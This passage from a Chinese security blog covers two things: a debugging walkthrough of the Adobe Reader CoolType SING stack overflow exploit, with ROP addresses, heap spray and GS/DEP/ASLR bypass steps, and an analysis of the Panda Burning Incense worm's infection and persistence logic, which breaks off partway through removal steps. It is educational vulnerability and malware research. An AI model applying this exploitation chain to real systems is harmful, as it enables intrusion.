class="string">"s"</span>;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="05-Exploit脚本分析"><a href="#05-Exploit脚本分析" class="headerlink" title="05-Exploit脚本分析"></a>05-Exploit脚本分析</h1><p>脚本文件：adobe_cooltype_sing.rb</p>
<h2 id="5-1-exploit"><a href="#5-1-exploit" class="headerlink" title="5.1-exploit()"></a>5.1-exploit()</h2><p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135324.jpg" alt="image-20200109200855435"></p>
<h2 id="5-2-make-ttf"><a href="#5-2-make-ttf" class="headerlink" title="5.2-make_ttf()"></a>5.2-make_ttf()</h2><ul>
<li><p>构建ttf，主要是其内部的SING表-UniqueName字段</p>
</li>
<li><p>其中有3处需要注意：</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135338.jpg" alt="image-20200109202036314"></p>
</li>
<li><p>0x4a80cb38和0x4a82a714是两个ROP块的起始地址，二者均位于icucnv36.dll文件中；（出自《漏洞战争》：在 Adobe Reader 的各版本上，这个 dll 上的这两处地址是始终不变的，因而保持了各版本的兼容性和 Exploit 的稳定性）；</p>
</li>
<li><p>0x0c0c0c0c是作为上述两ROP块跳转后，新的ESP地址，一旦retn，eip=[0x0c0c0c0c]，便可以获取程序执行流程，以呼应后面js中的堆喷射</p>
</li>
</ul>
<h2 id="5-3-make-js"><a href="#5-3-make-js" class="headerlink" title="5.3-make_js()"></a>5.3-make_js()</h2><ul>
<li><p>构造一个ROP块，内含多个API，以绕过数据执行保护DEP</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135329.jpg" alt="image-20200109205422860"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135328.jpg" alt="image-20200109205226207"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135333.jpg" alt="image-20200109205240108"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135321.jpg" alt="image-20200109205257124"></p>
</li>
<li><p>将ROP块与msf中所选payload合并，以实现最终payload</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135340.jpg" alt="image-20200109205448483"></p>
</li>
<li><p>构建堆喷射的JS代码</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135331.jpg" alt="image-20200109205542597"></p>
</li>
</ul>
<h2 id="5-4-make-pdf"><a href="#5-4-make-pdf" class="headerlink" title="5.4-make_pdf()"></a>5.4-make_pdf()</h2><p>构建pdf文件：添加ttf、js</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135317.jpg" alt="image-20200109205947491"></p>
<h1 id="06-OD动态调试"><a href="#06-OD动态调试" class="headerlink" title="06-OD动态调试"></a>06-OD动态调试</h1><h2 id="6-1-产生溢出"><a href="#6-1-产生溢出" class="headerlink" title="6.1-产生溢出"></a>6.1-产生溢出</h2><ol>
<li><p>打开Adobe Reader，OD中附加进程，溢出点strcat处下断（因加载基址不同，位置也相应变化）</p>
</li>
<li><p>溢出前，源地址数据如下：可见是SING表中uniqueName字段的内容</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135334.jpg" alt="image-20200109194046518"></p>
</li>
<li><p>简单分析：</p>
<ul>
<li>正常情况下uniqueName字段为28字节，远远小于栈空间大小0x104（如4.1-4），故不会发生溢出；</li>
<li>但是若经过特殊构造，基于strcat复制内存时的特性（直至遇到NULL才停止），则会出现溢出</li>
<li>如上图，此字段目前已有大小0x13E+（况且还没遇到NULL），早已大于固定的栈空间大小，一定会产生溢出</li>
</ul>
</li>
<li><p>单步，执行strcat函数后，因目标地址位于栈中，因此栈遭到破坏，栈溢出发生！</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135310.jpg" alt="image-20200109194704356"></p>
</li>
<li><p>将上面复制进去的数据下内存访问断点，F9执行，前面都是些无关紧要的访问，直至遇到call（敏感操作：调用栈中的地址）</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135320.jpg" alt="image-20200109195531266"></p>
</li>
</ol>
<h2 id="6-2-ROP绕DEP"><a href="#6-2-ROP绕DEP" class="headerlink" title="6.2-ROP绕DEP"></a>6.2-ROP绕DEP</h2><ul>
<li><p>OD中，单步执行call [eax]那条指令，进入第一个ROP块</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135313.jpg" alt="image-20200109204400899"></p>
</li>
<li><p>retn后进入第二个ROP块</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135326.jpg" alt="image-20200109204432204"></p>
</li>
<li><p>执行完两个ROP后，结合JS堆喷射，便完美控制程序流程</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135337.jpg" alt="image-20200109204933899"></p>
</li>
<li><p>观察栈中数据，出现各API：CreateFileA、CreateFileMappingA、MapViewOfFile、memcpy，依次下断，观察参数</p>
</li>
<li><p>执行至CreateFileA，创建一个文件：名字-iso88951、权限-所有、属性-隐藏</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135339.jpg" alt="image-20200109210905235"></p>
</li>
<li><p>执行至CreateFileMappingA，创建映射对象：hFile为上述创建的文件句柄（文件与物理页映射，以便为程序提供共享内存）、属性为读/写/执行（绕过DEP）、大小为0x10000（存储shellcode足矣）、</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135318.jpg" alt="image-20200109211113584"></p>
</li>
<li><p>执行至MapViewOfFile，将物理页与进程虚拟地址进行映射：hMapObject为上述创建的映射对象句柄；</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135322.jpg" alt="image-20200109211759279"></p>
</li>
<li><p>执行后，发现进程虚拟空间中多了一块地址，且具有执行权限，正式iso文件映射而来的共享内存</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135315.jpg" alt="image-20200109212146437"></p>
</li>
<li><p>执行至memcpy，拷贝内存：目的地址是刚申请的具有执行权限的内存空间、而源地址应该就是shellcode所在地</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135311.jpg" alt="image-20200109212342715"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135314.jpg" alt="image-20200109212540025"></p>
</li>
</ul>
<h2 id="6-3-执行shellcode"><a href="#6-3-执行shellcode" class="headerlink" title="6.3-执行shellcode"></a>6.3-执行shellcode</h2><ul>
<li><p>执行memcpy后，目的地填充为shellcode，下内存访问断点，可何时访问</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135323.jpg" alt="image-20200109213223462"></p>
</li>
<li><p>F9执行，发现会有解密操作，原因是exploit脚本中对js进行了加密</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135325.jpg" alt="image-20200109213458312"></p>
</li>
<li><p>取消断点，循环解密后F2，使其完成解密，此时发现shellcode中出现字符串“cacl.exe”，正是msf中设置的c++属性，即payload-Windows/exec要执行的计算器程序</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135316.jpg" alt="image-20200109213817626"></p>
</li>
<li><p>Windows/exec会调用系统API：WinExec，ctrl+g搜索并下断，执行至此，发现确实是计算器程序（若设置的payload为meterpreter，则是建立网络链接去反向连接攻击者</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135330.jpg" alt="image-20200109213952791"></p>
</li>
<li><p>F9放行，成功弹出计算器，即成功执行payload，大功告成！</p>
</li>
</ul>
<h1 id="07-修复方案"><a href="#07-修复方案" class="headerlink" title="07-修复方案"></a>07-修复方案</h1><ul>
<li>归根结底，是因为strcat执行前没有检查输入长度，使得大小不固定的空间可被复制到具有固定大小的栈空间中</li>
<li>在执行strcat前，先strlen判定一下长度，再进行操作</li>
<li>或者直接使用strncat限定长度来进行字符串拼接</li>
</ul>
<h1 id="08-知识总结"><a href="#08-知识总结" class="headerlink" title="08-知识总结"></a>08-知识总结</h1><h2 id="8-1-绕过GS"><a href="#8-1-绕过GS" class="headerlink" title="8.1-绕过GS"></a>8.1-绕过GS</h2><ul>
<li><p>尽管通过安全cookie的检查，可以很好的探测栈是否被破坏/溢出；但是其也有很大弊端：只有在函数返回前，才会去检查security cookie，在之前是没有任何保护措施的</p>
</li>
<li><p>故只要在􏲐 Security Cookie被检查之前劫持程序流程，就可无视GS保护，如OD中所示，产生溢出后，下内存访问断点，会有call 栈内数据的操作，由此直接劫持程序流程，从而绕过GS</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-10-081309.jpg" alt="image-20200110154908752"></p>
</li>
</ul>
<h2 id="8-2-绕过DEP"><a href="#8-2-绕过DEP" class="headerlink" title="8.2-绕过DEP"></a>8.2-绕过DEP</h2><ul>
<li><p>通过构造ROP链，利用程序自身加载的库文件中的指令，来拼接出一系列指令去执行</p>
</li>
<li><p>如上述所言，构造的ROP链依次调用了：CreateFileA、CreateFileMapping、MapViewOfFile这些API，为进程申请了一块具有读写执行权限的共享内存空间；</p>
</li>
<li><p>进一步调用memcpy将shellcode复制到此空间，从而实现shellcode的执行，绕过DEP</p>
</li>
</ul>
<h2 id="8-3-绕过ASLR"><a href="#8-3-绕过ASLR" class="headerlink" title="8.3-绕过ASLR"></a>8.3-绕过ASLR</h2><ul>
<li>尽管开启ASLR后，其对堆基址做了随机化处理，但对于Heap Spray来说是无效的</li>
<li>不管怎样对堆基址进行随机化，其基址总会出现在较低的内存空间，远远小于堆喷射所需的0x0c0c0c0c地址，因此，Heap spray 完全可以绕过 ASLR </li>
</ul>
<h2 id="8-4-思路总结"><a href="#8-4-思路总结" class="headerlink" title="8.4-思路总结"></a>8.4-思路总结</h2><ol>
<li>构造恶意数据，实现栈溢出</li>
<li>函数返回前（安全cookie检查前），调用恶意数据中的地址，开始实施ROP</li>
<li>通过ROP，劫持执行流程指向0x0C0C0C0C</li>
<li>js堆喷射覆盖地址0x0C0C0C0C，从而执行另一块ROP</li>
<li>ROP块中为进程申请可执行权限的内存空间，并将shellcode复制其中</li>
<li>shellcode执行，成功利用！</li>
</ol>
<h1 id="09-参考文献"><a href="#09-参考文献" class="headerlink" title="09-参考文献"></a>09-参考文献</h1><ul>
<li>《漏洞战争》</li>
<li>《0day安全软件漏洞分析技术》</li>
<li>《Metasploit渗透测试魔鬼训练营》</li>
</ul>
<p>首发于看雪论坛：<a href="https://bbs.pediy.com/thread-257172.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257172.htm</a></p>
]]></content>
      <categories>
        <category>软件安全/逆向</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>熊猫烧香病毒分析</title>
    <url>/2019/11/29/reverse/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="01-样本概况"><a href="#01-样本概况" class="headerlink" title="01-样本概况"></a>01-样本概况</h1><h2 id="1-1-样本信息"><a href="#1-1-样本信息" class="headerlink" title="1.1-样本信息"></a>1.1-样本信息</h2><ul>
<li><p>基本信息</p>
  <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">文件: C:\Users\<span class="number">15</span>pb-win7\Desktop\xiongmao.exe</span><br><span class="line">大小: <span class="number">30001</span> bytes</span><br><span class="line">修改时间: <span class="number">2018</span>年<span class="number">7</span>月<span class="number">14</span>日, <span class="number">8</span>:<span class="number">40</span>:<span class="number">21</span></span><br><span class="line">MD5: <span class="number">512301</span>C535C88255C9A252FDF70B7A03</span><br><span class="line">SHA1: CA3A1070CFF311C0BA40AB60A8FE3266CFEFE870</span><br><span class="line">CRC32: E334747C</span><br></pre></td></tr></table></figure>
</li>
<li><p>病毒行为：</p>
<p>  1.在系统目录下生成病毒程序并执行</p>
<p>  2.修改注册表</p>
<p>  3.添加启动项</p>
<p>  4.目录下产生Desktop_ini文件</p>
<p>  5.关闭网络共享</p>
<p>  6.存在网络连接</p>
<p>  7.有加密的流程传输</p>
<p>  8.感染文件<a id="more"></a></p>
</li>
</ul>
<h2 id="1-2-测试环境"><a href="#1-2-测试环境" class="headerlink" title="1.2-测试环境"></a>1.2-测试环境</h2><ul>
<li><p>系统环境: </p>
<ul>
<li>Windows10-64位</li>
<li>Windows7-32位</li>
</ul>
</li>
<li><p>工具: </p>
<ul>
<li>010Editor：查看感染标记</li>
<li>OllyDebug：动态调试</li>
<li>IDA：静态调试</li>
<li>PCHunter：进程查看及结束</li>
<li>火绒剑：观察病毒行为</li>
<li>Hash工具：计算病毒文件哈希值</li>
<li>WSExplorer：查看病毒程序网络连接</li>
<li>VS 2017：编写专杀工具</li>
</ul>
</li>
</ul>
<h2 id="1-3-分析目标"><a href="#1-3-分析目标" class="headerlink" title="1.3-分析目标"></a>1.3-分析目标</h2><ol>
<li><p>提取病毒样本</p>
</li>
<li><p>分析病毒行为</p>
</li>
<li><p>分析病毒代码细节，获取其执行流程</p>
</li>
<li><p>提取病毒特征、手动查杀及编写专杀工具</p>
</li>
</ol>
<h1 id="02-具体行为分析"><a href="#02-具体行为分析" class="headerlink" title="02-具体行为分析"></a>02-具体行为分析</h1><h2 id="2-1-文件操作"><a href="#2-1-文件操作" class="headerlink" title="2.1-文件操作"></a>2.1-文件操作</h2><p>病毒创建了大量文件，并且会修改/感染正常的程序</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003911.jpg" alt="image-20200113082906778"></p>
<h2 id="2-2-注册表操作"><a href="#2-2-注册表操作" class="headerlink" title="2.2-注册表操作"></a>2.2-注册表操作</h2><p>创建了新的注册表项，并且通过修改注册表，实现病毒的自启动</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-3928.jpg" alt="image-20200113082918792"></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003834.jpg" alt="img"></p>
<h2 id="2-3-进程操作"><a href="#2-3-进程操作" class="headerlink" title="2.3-进程操作"></a>2.3-进程操作</h2><p>枚举进程来查看是否有杀毒软件，创建进程来运行自己产生的恶意程序spo、打开设备以便感染U盘等硬件设备</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003930.jpg" alt="image-20200113082930916"></p>
<h2 id="2-4-网络操作"><a href="#2-4-网络操作" class="headerlink" title="2.4-网络操作"></a>2.4-网络操作</h2><p>存在大量http请求可以实施DDos攻击，也可以发送数据包，以便上传私密信息到服务器，存在网络连接，以便用户从服务器下载木马等恶意程序</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003913.jpg" alt="image-20200113082943094"></p>
<h2 id="2-5-行为监控"><a href="#2-5-行为监控" class="headerlink" title="2.5-行为监控"></a>2.5-行为监控</h2><p>可以修改注册表来实现自启动项，会感染PE文件，进行自我删除和复制</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003909.jpg" alt="img"></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-3917.jpg" alt="img"></p>
<h2 id="2-6-执行监控"><a href="#2-6-执行监控" class="headerlink" title="2.6-执行监控"></a>2.6-执行监控</h2><p>其通过cmd命令删除了网络共享</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003827.jpg" alt="image-20200113083017929"></p>
<h1 id="03-恶意代码分析"><a href="#03-恶意代码分析" class="headerlink" title="03-恶意代码分析"></a>03-恶意代码分析</h1><h2 id="3-1-脱壳"><a href="#3-1-脱壳" class="headerlink" title="3.1-脱壳"></a>3.1-脱壳</h2><ul>
<li><p>是否有壳：PEiD查看xiongmao.exe存在FSG 2.0的壳</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003931.jpg" alt="img"></p>
</li>
<li><p>x32Debug中打开xiongmao，单步跟踪直到<code>jmp dword ptr [ebx + 0xc]</code>，其跳往真实OEP处，利用Scylla插件进行脱壳，最后保存为xiongmao_dump_SCY.exe</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003830.jpg" alt="image-20200113083033910"></p>
</li>
<li><p>PEiD深度扫描xiongmao_dump_SCY.exe显示没壳，再查看其输入表也正常，说明脱壳成功</p>
</li>
</ul>
<h2 id="3-2-整体流程"><a href="#3-2-整体流程" class="headerlink" title="3.2-整体流程"></a>3.2-整体流程</h2><ul>
<li><p>IDA：Shift+F5 签名窗口中，添加delphi特征库，应用后可识别大量库函数，根据伪代码推测功能</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003922.jpg" alt="image-20200113083053799"></p>
</li>
<li><p>动态调试，看sub_405250功能，call之前，eax中传参是一堆杂乱的中文字符，call之后，将局部变量ebp-0x14中的值赋值给edx，此时是正常的中文，随后进行字符串的比较，因此可判定其为字符串解密函数，暂记做DecodeString，并在IDA中修改（快捷键n）</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003822.jpg" alt="image-20200113083120144"></p>
</li>
<li><p>经过IDA和OD的结合分析，最终可得到整体流程图，如下：</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003929.jpg" alt="image-20200113083132668"></p>
</li>
</ul>
<h2 id="3-3-代码块sub-40819c"><a href="#3-3-代码块sub-40819c" class="headerlink" title="3.3-代码块sub-40819c"></a>3.3-代码块sub-40819c</h2><ul>
<li><p>IDA：进入819c函数内部，某处出现了样本文件名，应该是敏感部分，要重点关注；此处有两个sub-xxx函数不知用途</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003908.jpg" alt="image-20200113083146999"></p>
</li>
<li><p>IDA：进入sub-4053ac内部，有一个获取系统目录的库函数，因此可初步判定其功能</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003912.jpg" alt="image-20200113083159177"></p>
</li>
<li><p>OD：验证上述推测是否成立，ctrl+g到4053a4处，内部下断运行至此，从堆栈中找到调用位置，取消内部断点调用位置下断重新运行，单步测试；运行后，将局部变量压栈，可见其就是系统目录，再与后面的子目录和文件名拼接，得到最终地址；推测正确，因此IDA中将其命名为GetSysDir以作标示</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-3908.jpg" alt="image-20200113083212322"></p>
</li>
<li><p>综上，本函数功能：复制自身xiongmao.exe到系统目录下并重命名为spo0lsv.exe，然后执行</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003906.jpg" alt="image-20200113083224716"></p>
</li>
</ul>
<h2 id="3-4-代码块sub-40d18c"><a href="#3-4-代码块sub-40d18c" class="headerlink" title="3.4-代码块sub-40d18c"></a>3.4-代码块sub-40d18c</h2><ul>
<li><p>双击进入，内部有三个函数：40a5b0、40c374、40bacc</p>
</li>
<li><p>进入40a5b0：创建线程，其线程回调函数为40a48c</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003926.jpg" alt="image-20191126141107618"></p>
</li>
<li><p>再进入40a48c：while循环执行409448</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003832.jpg" alt="image-20191126142958236"></p>
</li>
<li><p>再进入409448，发现’desktop_.ini’字符串，也有获取本地时间的行为，联想病毒在每个目录下创建ini且内容为日期的行为，推测此处便是代码执行处</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003904.jpg" alt="image-20191126143227261"></p>
</li>
<li><p>进入40c374，设置一个定时器</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003923.jpg" alt="image-20191126143539809"></p>
</li>
<li><p>进入timerfunc定时器回调函数，应该就是创建setup.exe文件</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003835.jpg" alt="image-20191126145205001"></p>
</li>
<li><p>进入40bacc，创建一个线程执行40ba8c</p>
<p>  进入40ba8c，后再进入40b864，发现是网络连接相关</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003823.jpg" alt="image-20191126145556993"></p>
</li>
<li><p>综上，根据病毒行为以及代码中出现的敏感字符串、关键函数等，大致可了解sub-40d18c内部有三个函数，功能分别是：新建线程来创建desktop_.ini配置文件、设置计时器来创建setup.exe文件、创建线程进行网络连接</p>
</li>
</ul>
<h2 id="3-5-代码块sub-40d088"><a href="#3-5-代码块sub-40d088" class="headerlink" title="3.5-代码块sub-40d088"></a>3.5-代码块sub-40d088</h2><ul>
<li><p>进入函数，有6个计时器，分别执行6个函数，依次查看</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003828.jpg" alt="image-20191126150054902"></p>
</li>
<li><p>40cee4，添加启动项、修改注册表</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003933.jpg" alt="image-20191126154346012"></p>
</li>
<li><p>40d040，访问网站并获取系统目录，推测是从服务器下载恶意程序</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-3923.jpg" alt="image-20191126163600580"></p>
</li>
<li><p>40d048，内部有两个函数，第一个同40d040，第二个执行cmd命令关闭网络共享</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-3914.jpg" alt="image-20191126160004664"></p>
</li>
<li><p>407430，关闭杀毒软件服务、删除杀毒软件启动项（从字符串可见为常见的杀软</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-3919.jpg" alt="image-20191126160530506"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003915.jpg" alt="image-20191126160445800"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003836.jpg" alt="image-20191126160729078"></p>
</li>
<li><p>40cc4c，打开URL，访问网站获取内容</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003831.jpg" alt="image-20191126162911158"></p>
</li>
<li><p>40c728，类似40d040，都是下载恶意代码</p>
</li>
<li><p>综上，sub-40d088内部这几个函数分别实现了：添加启动项、修改注册表、下载恶意代码、访问网站获取内容、关闭杀软服务、删除杀软启动项、关闭网络共享</p>
</li>
</ul>
<h2 id="3-6-启动过程分析"><a href="#3-6-启动过程分析" class="headerlink" title="3.6-启动过程分析"></a>3.6-启动过程分析</h2><ul>
<li><p>ini配置文件的操作：获取当前路径，并将“Desktop_.ini”拼接到当前路径中，同时检查此文件是否存在，若文件存在，则删除</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003927.jpg" alt="image-20200113083258560"></p>
</li>
<li><p>ini配置文件操作完成后，进入新的流程：为了复制病毒信息以感染其他文件，故将病毒文件信息读取到内存中；同时也设置了标记信息</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003921.jpg" alt="image-20191128091045656"></p>
</li>
<li><p>随后跳往4082DB处：进行了标记检查工作，来判断病毒程序是否被多次运行</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003919.jpg" alt="image-20191128090924847"></p>
</li>
<li><p>随后代码中出现“spo0lcv.exe”字符串：找到运行的进程“spo0lsv.exe”并终止；病毒第一次执行时，需要将自身复制一份到系统目录下，并伪装成“spo0lsv.exe”启动；</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003932.jpg" alt="image-20200113083320628"></p>
</li>
<li><p>字符串比较后，若当前病毒文件已经复制到了系统目录下且被伪造成了“spo0lsv.exe”，则会跳转到40845E处：释放之前申请存放病毒文件信息的内存（OD调试时，可手动修改JZ条件，使之完成跳转）</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003920.jpg" alt="image-20191128101017016"></p>
</li>
<li><p>随之跳往 408741：获取标记并进行检查，当标记==1时，会进入 408477来进行进一步检查（此代码块只有被感染的程序才会执行，OD打开被感染文件进行调试</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003914.jpg" alt="image-20191128101935542"></p>
</li>
</ul>
<h2 id="3-7-感染过程分析"><a href="#3-7-感染过程分析" class="headerlink" title="3.7-感染过程分析"></a>3.7-感染过程分析</h2><ul>
<li><p>内部三个子模块：前二本地感染，第三通过网络</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003910.jpg" alt="image-20191127145219156"></p>
</li>
<li><p>创建感染线程：找到线程回调函数</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003928.jpg" alt="image-20191127145152729"></p>
</li>
<li><p>感染线程的线程回调函数：遍历驱动器盘符的数目，进入到驱动器中，遍历所有可感染文件以进行病毒复制</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-3828.jpg" alt="image-20191127151719814"></p>
</li>
<li><p>_FindAndInfectFile：遍历驱动器下的文件信息，将文件与文件夹进行了分类，排除了特殊文件夹；在判断是否为特殊文件夹的过程中，都是以大写形式进行对比的，以防止因大小写不同而造成错误；在这可跳到处理文件的地方</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-3931.jpg" alt="image-20191127170811439"></p>
</li>
<li><p>_FindAndInfectFile：感染前的检查工作，ini中保存的时间与刚刚获取的时间进行比较，来判断是否已经被感染</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003918.jpg" alt="image-20200113083345505"></p>
</li>
<li><p>如4中，若当前获取到的是文件时，开始处理文件：对文件进行检查，只要后缀为“GHO”，就判定为ghost备份文件，直接删除，防止用户还原系统（真tm的坏）</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003924.jpg" alt="image-20191127172133510"></p>
</li>
<li><p>一旦删除了系统的备份文件，病毒就开始肆意感染：大致分为两种，一种是本地可执行文件（如exe为后缀的），另一种是Web网页文件（如html为后缀的）</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003833.jpg" alt="image-20191127193508763"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-3832.jpg" alt="image-20191127193912691"></p>
</li>
<li><p>感染exe等本地执行文件，_InfectFile：首先将目标文件读取到内存中并获取文件名及其大小、然后将自身文件复制到目标文件前并追加目标程序的原始文件、最后添加感染标记，结束感染过程</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003905.jpg" alt="image-20191127214435254"></p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003852.jpg" alt="image-20191127214817563"></p>
</li>
<li><p>被感染文件 ： 病毒文件 + 原文件 + 感染标识，标识如下 </p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-3837.jpg" alt="image-20200113083407839"></p>
</li>
</ul>
<h2 id="3-8-自我保护行为"><a href="#3-8-自我保护行为" class="headerlink" title="3.8-自我保护行为"></a>3.8-自我保护行为</h2><ul>
<li><p>若找到标记字符，则会跳转到408477，此代码块只有被感染的程序才会执行，现IDA中打开原病毒静态分析（也可OD中打开被感染程序动态分析</p>
</li>
<li><p>代码段408477：从被感染文件中分离提取出原始文件（由于感染文件时写入了标记信息，根据标记可得到原始文件），执行后，在被感染文件所在目录下释放出其原始文件</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003907.jpg" alt="image-20200113083433875"></p>
</li>
<li><p>代码段 408584：被感染文件的主要工作是维护进程中伪造的病毒程序spo0lsv. exe，若spo被删除，则会由被感染的程序再次生成（春风吹又生，除非删除所有被感染程序）</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003916.jpg" alt="image-20191128113200558"></p>
</li>
</ul>
<h1 id="04-解决方案"><a href="#04-解决方案" class="headerlink" title="04-解决方案"></a>04-解决方案</h1><h2 id="4-1-病毒特征"><a href="#4-1-病毒特征" class="headerlink" title="4.1-病毒特征"></a>4.1-病毒特征</h2><ul>
<li><p>病毒文件的哈希值如下：</p>
<ul>
<li>MD5: 512301C535C88255C9A252FDF70B7A03</li>
<li>SHA1: CA3A1070CFF311C0BA40AB60A8FE3266CFEFE870</li>
<li>CRC32: E334747C</li>
</ul>
</li>
<li><p>被感染文件中，文件最后有感染表示标识：WhBoy + 原文件名 + exe + + ascii码为1的字符 + 随机数+ ascii码为2的字符</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-13-003829.jpg" alt="image-20200113083415753"></p>
</li>
</ul>
<h2 id="4-2-手工查杀"><a href="#4-2-手工查杀" class="headerlink" title="4.2-手工查杀"></a>4.2-手工查杀</h2><ol>
<li><p>cmd命令行下taskkill杀掉进程，或者直接利用PCHunter等工具结束进程</p>
</li>
